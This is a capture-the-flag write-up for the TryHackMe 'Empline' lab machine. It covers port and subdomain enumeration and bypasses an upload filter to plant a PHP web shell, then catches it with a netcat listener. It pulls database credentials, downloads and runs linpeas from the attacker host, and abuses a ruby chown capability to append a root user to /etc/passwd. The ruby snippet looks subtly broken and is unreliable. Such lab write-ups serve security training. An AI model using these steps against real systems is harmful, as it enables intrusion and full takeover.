# Empline Writeup

##### Room link: https://tryhackme.com/room/empline

<p align="center">
  <img src="https://i.imgur.com/cZX0dRz.png">
</p>

## Tasks:
Get all the flags to complete the room.

User.txt

Root.txt

## 1. Enumeration
Start by enumerating the open ports using nmap

> ┌──(root㉿kali)-[~]
> └─# nmap -sV --top-ports 20 10.10.192.54    
> Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-09 12:00 SAST
> Nmap scan report for 10.10.192.54
> Host is up (0.18s latency).
> 
> PORT     STATE  SERVICE       VERSION
> 
> 21/tcp   closed ftp
> 
> 22/tcp   open   ssh           OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
> 
> 23/tcp   closed telnet
> 
> 25/tcp   closed smtp
> 
> 53/tcp   closed domain
> 
> 80/tcp   open   http          Apache httpd 2.4.29 ((Ubuntu))
> 
> ...
> 
> 3306/tcp open   mysql         MySQL 5.5.5-10.1.48-MariaDB-0ubuntu0.18.04.1
> 
> 3389/tcp closed ms-wbt-server
> 
> 5900/tcp closed vnc
> 
> 8080/tcp closed http-proxy
> 
> Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
> 
> 
> Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
> 
> Nmap done: 1 IP address (1 host up) scanned in 14.86 seconds

We have 3 open ports, 22, 80 and 3306.

## Adding the host to /etc/hosts

I like to add the IP address to the /etc/hosts file, so that we can search for subdomains.

<p align="center">
  <img src="https://i.imgur.com/D3lqsvh.png">
</p>

## Ports

### Port 80:

<p align="center">
  <img src="https://imgur.com/jDy6YXe.png">
</p>

### Enumerating subdirectories

Lets use WFuzz to enumerate subdirectories on empline.thm:

> ┌──(root㉿kali)-[~]
> └─# wfuzz -c -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -u http://empline.thm -H >"Host:FUZZ.empline.thm" --hw 914

We added "--hw 914" to exclude the "word 914" in the scan.

<p align="center">
  <img src="https://i.imgur.com/7u9BgCy.png">
</p>

We can see the subdirectory "job", lets have add it to /etc/hosts and take a look

> ──(root㉿kali)-[~]
> └─# cat /etc/hosts
> 
> 127.0.0.1       localhost
> 
> 127.0.1.1       kali
> 
> 10.10.192.54    job.empline.thm empline.thm
> 
> The following lines are desirable for IPv6 capable hosts
> 
> ::1     localhost ip6-localhost ip6-loopback
> 
> ff02::1 ip6-allnodes
> 
> ff02::2 ip6-allrouters
> 


### job.empline.thm

<p align="center">
  <img src="https://imgur.com/nKgVlrt.png">
</p>

Lets enumerate the new subdomain:

<p align="center">
  <img src="https://i.imgur.com/S6Tk8lX.png">
</p>


"/db" looked interesting, but it lead me down a rabbit hole, and it wasnt worth looking at. 

### Interesting directories:

We found two directories worth taking a look at: /upload and /careers.

### Careers

Click on "Current opening positions"

<p align="center">
  <img src="https://i.imgur.com/w6rVxnp.png">
</p>

Select the job title:

<p align="center">
  <img src="https://i.imgur.com/tjOHnlh.png">
</p>

And go to "Apply to position"

<p align="center">
  <img src="https://i.imgur.com/QlJOtfM.png">
</p>

#### Looks like theres an upload area where we can put a shell!

<p align="center">
  <img src="https://i.imgur.com/6mIgu1k.png">
</p>

### Uploading our shell

I first tried uploading a shell with a .php extension, but it seems like the page filters file extensions, so lets try intercepting the request with burp.


Lets change the "Content-Type" to "image/jpg" and add some random letters before the "<? php" tag.

<p align="center">
  <img src="https://i.imgur.com/uMA5jwY.png">
</p>

If we navigate to "job.empline.thm/upload", we see a new directory "Careerportaladd" and inside there we can see our shell!

<p align="center">
  <img src="https://i.imgur.com/AMdecYu.png">
</p>

<p align="center">
  <img src="https://i.imgur.com/iR682UJ.png">
</p>

### Initial access

Lets start up our netcat listener:

> ┌──(root㉿kali)-[~]
> └─# nc -lnvp 1234  
> listening on [any] 1234 ...

And now we can click on our shell in /upload/careerportaladd.

Stabilise the shell, and we are in as www-data !

<p align="center">
  <img src="https://i.imgur.com/eAWiI34.png">
</p>


### Privilege Escalation

If we cd to /var/www/opencats, we can see there is a config.php file, lets have a look at that.

> www-data@empline:/var/www/opencats$ ls

> CHANGELOG.MD   careersPage.css  images             rebuild_old_docs.php

> Error.tpl      ci               index.php          rss

> INSTALL_BLOCK  ckeditor         installtest.php    scripts

> LICENSE.md     composer.json    installwizard.php  src

> QueueCLI.php   composer.lock    js                 temp

> README.md      config.php       lib                test

> ajax           constants.php    main.css           upload

> ajax.php       db               modules            vendor

> attachments    docker           not-ie.css         wsdl

> careers        ie.css           optional-updates   xml

> www-data@empline:/var/www/opencats$ cat config.php | grep define

We see an interesting username and password, presumably for mysql, lets give it a try.

<p align="center">
  <img src="https://imgur.com/mc0N3UL.jpg">
</p>

Let's try it:

> www-data@empline:/var/www/opencats$ mysql -u [REDACTED] -p
> 
> Enter password:

We're in! 

There's a table "user" which contains a username and password:

<p align="center">
  <img src="https://imgur.com/B783PD8.jpg">
</p>

The password is MD5 encoded, so lets head over to crackstation.net:

<p align="center">
  <img src="https://imgur.com/5Mx5qVh.png">
</p>

## User.txt flag:

With the user's password, lets try change user on the machine:

> www-data@empline:/var/www/opencats$ su george 

> Password: 

> george@empline:/var/www/opencats$ 

The flag is in george's home directory

> cd /home/george
> 
> george@empline:~$ cat user.txt
>
> [REDACTED]
>
> george@empline:~$ 

## Root.txt flag

At this point I decided to upload linpeas to the machine, and since we own george's home directory, we have write privileges.

### Uploading linpeas

On attacker's machine, start a http server in the same directory that linpeas is stored

> ┌──(root㉿kali)-[/home/…/Desktop/THM/practice/linpeas]
> └─# python3 -m http.server 4444
> Serving HTTP on 0.0.0.0 port 4444 (http://0.0.0.0:4444/) ...

And on the empline machine:

> george@empline:~$ wget http://10.18.42.194:4444/linpeas.sh
> 
> --2023-05-09 11:25:44--  http://10.18.42.194:4444/linpeas.sh
> 
> Connecting to 10.18.42.194:4444... connected.
> 
> HTTP request sent, awaiting response... 200 OK
> 
> Length: 830030 (811K) [text/x-sh]
> 
> Saving to: ‘linpeas.sh’
> 
> linpeas.sh          100%[===================>] 810.58K   501KB/s    in 1.6s    
> 
> 2023-05-09 11:25:46 (501 KB/s) - ‘linpeas.sh’ saved [830030/830030]
> 
> george@empline:~$ chmod +x linpeas.sh 
> 
> george@empline:~$ ./linpeas.sh


Linpeas discovered /usr/local/bin/ruby = cap_chown+ep. After doing some research I came across this link: https://ruby-doc.org/stdlib-2.4.1/libdoc/fileutils/rdoc/FileUtils.html.

Chown changes owner and group of the named files!

Let's check our user id:

> george@empline:~$ id
>
>uid=1002(george) gid=1002(george) groups=1002(george)
>
>george@empline:~$ 


Lets create a new ruby file:

> nano exploit.rb

We'll write some code to change the file permissions of /etc/passwd using our ID:1002:

> File = File.new( "/etc/passwd", "r" )
>
> File.chown(1002, 1002)

Now run the ruby file:

> ruby exploit.rb 

Check our permissions on /etc/passwd:

> george@empline:~$ ls -l /etc/passwd
> 
> -rw-r--r-- 1 george george 1660 Jul 20  2021 /etc/passwd


### Editing the /etc/passwd file:

On the attacker's machine, make a new SHA-512 encoded password:

> ┌──(root㉿kali)-[~]
> 
> └─# mkpasswd -m sha-512 password
> 
> $6$Nqybh9KBX8spC3fP$z8b3aRwcZSXDCfEnOllOO2srT/Pn77F8DWiUBG4gUCFWTG1cD26Tjaie3UTUT8Kku1/ksl4fJ/Jn.NVB4Ac4x0

Back on the Empline machine, edit the /etc/passwd file:

> george@empline:~$ echo "pwn:$6$Nqybh9KBX8spC3fP$z8b3aRwcZSXDCfEnOllOO2srT/Pn77F8DWiUBG4gUCFWTG1cD26Tjaie3UTUT8Kku1/ksl4fJ/Jn.NVB4Ac4x0:0:0:root:/root:/bin/sh" > >> /etc/passwd
> 
> george@empline:~$ cat /etc/passwd
> 
> root: x :0:0:root:/root:/bin/bash
> 
> daemon: x :1:1:daemon:/usr/sbin:/usr/sbin/nologin
> 
> bin: x :2:2:bin:/bin:/usr/sbin/nologin
> 
> sys: x :3:3:sys:/dev:/usr/sbin/nologin
> 
> ...
> 
> ubuntu: x :1001:1001:Ubuntu:/home/ubuntu:/bin/bash
> 
> mysql: x :111:116:MySQL Server,,,:/nonexistent:/bin/false
> 
> george: x :1002:1002::/home/george:/bin/bash
> 
> pwn:$6$Nqybh9KBX8spC3fP$z8b3aRwcZSXDCfEnOllOO2srT/Pn77F8DWiUBG4gUCFWTG1cD26Tjaie3UTUT8Kku1/ksl4fJ/Jn.NVB4Ac4x0:0:0:root:/root:/bin/sh
> 
> george@empline:~$ 

And now su to the new user with the password we created:

> george@empline:~$ su pwn
> 
> Password: 
> 
> $ id
> 
> uid=0(root) gid=0(root) groups=0(root)
> 
> $ cd /root
> 
> $ cat root.txt
> 
> [REDACTED]
> 
> $
 
# End






